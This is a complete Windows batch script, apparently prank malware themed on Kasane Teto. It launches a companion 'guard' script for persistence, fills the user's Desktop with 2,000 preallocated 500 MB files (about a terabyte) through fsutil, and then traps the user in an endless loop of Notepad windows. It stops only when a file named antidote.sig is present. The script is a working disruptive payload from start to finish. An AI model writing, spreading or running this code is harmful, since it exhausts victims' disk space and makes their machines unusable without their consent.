@echo off
setlocal enabledelayedexpansion
title TETO_PRIME
color 0D

:init
if exist "antidote.sig" exit
tasklist /FI "WINDOWTITLE eq TETO_GUARD" 2>nul | find /I /N "cmd.exe" >nul
if "%ERRORLEVEL%"=="1" start /min TETO_GUARD.bat

:: --- STORAGE PLAGUE ---
cd /d %userprofile%\Desktop
for /L %%i in (1,1,20) do (
    if exist "%~dp0\antidote.sig" exit
    mkdir "Teto_is_better_than_Miku_%%i" >nul 2>&1
    cd "Teto_is_better_than_Miku_%%i"
    for /L %%j in (1,1,100) do (fsutil file createnew "Teto_Supreme_%%j.txt" 524288000 >nul 2>&1)
    cd ..
)

:annoy_loop
if exist "%~dp0\antidote.sig" exit
echo Kasane Teto notice me! > "%temp%\teto.txt"
start /wait notepad.exe "%temp%\teto.txt"
goto :annoy_loop
